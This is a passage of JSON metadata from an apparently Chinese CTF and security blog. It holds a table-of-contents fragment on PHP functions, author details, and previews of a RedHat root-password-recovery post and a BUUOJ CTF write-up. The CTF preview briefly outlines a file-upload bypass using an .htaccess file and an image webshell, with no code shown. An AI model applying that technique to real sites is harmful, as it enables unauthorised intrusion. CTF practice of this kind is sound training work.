toc-level-2\"><a class=\"toc-link\" href=\"#get-defined-vars\"><span class=\"toc-text\">get_defined_vars()</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#session-id\"><span class=\"toc-text\">session_id()</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#dirname-amp-chdir\"><span class=\"toc-text\">dirname() &amp; chdir()</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5\"><span class=\"toc-text\">参考链接</span></a></li></ol>","author":{"name":"沐子龍","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"RedHat学习(一)","uid":"d5ddaa5391254c799899399e917138e4","slug":"RedHat学习-一","date":"2020-11-04T13:25:26.000Z","updated":"2020-12-26T14:19:46.000Z","comments":true,"path":"api/articles/RedHat学习-一.json","keywords":"A1andNS","cover":"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200601211235.jpg","text":"这个是redhat系统学习系列文章，为了提升对linux系统的了解和熟悉程度，提高运维能力。 root用户突然忘记，又急需使用的时候就可以使用这个手法，但是如果你自习一想，如果你根本就不知道密码，又想要登录root账户，这种手法就有点意思了，仿佛提权。 紧急救援模式恢复密码在启动...","link":"","photos":[],"count_time":{"symbolsCount":"3k","symbolsTime":"3 mins."},"categories":[{"name":"Linux学习","slug":"Linux学习","count":7,"path":"api/categories/Linux学习.json"}],"tags":[{"name":"Linux","slug":"Linux","count":11,"path":"api/tags/Linux.json"},{"name":"Redhat","slug":"Redhat","count":5,"path":"api/tags/Redhat.json"}],"author":{"name":"沐子龍","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"BUUOJ刷题20201026-31","uid":"1be9c62e526acccb43c839a00721a69f","slug":"BUUOJ刷题20201026-31","date":"2020-10-26T11:30:40.000Z","updated":"2021-06-28T14:58:09.776Z","comments":true,"path":"api/articles/BUUOJ刷题20201026-31.json","keywords":"A1andNS","cover":"https://gitee.com/A1andNS/blogimage/raw/master/img/3.png","text":"[MRCTF2020]你传你🐎呢考点：文件上传、图片马 上传绕过怎么绕呢，试了上传php,php3，php4，phtml都是没过滤了。试了一下jpg和.htaccess文件都可以上传，所以就可以使用图片马，并且直接给出了路径，友好。 上传一个.htaccess文件 AddType...","link":"","photos":[],"count_time":{"symbolsCount":"7.6k","symbolsTime":"7 mins."},"categories":[{"name":"CTF","slug":"CTF","count":42,"path":"api/categories/CTF.json"}],"tags":[{"name":"WEB","slug":"WEB","count":39,"path":"api/tags/WEB.json"},{"name":"BUUOJ","slug":"BUUOJ","count":13,"path":"api/tags/BUUOJ.json"}],"author":{"name":"沐子龍","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}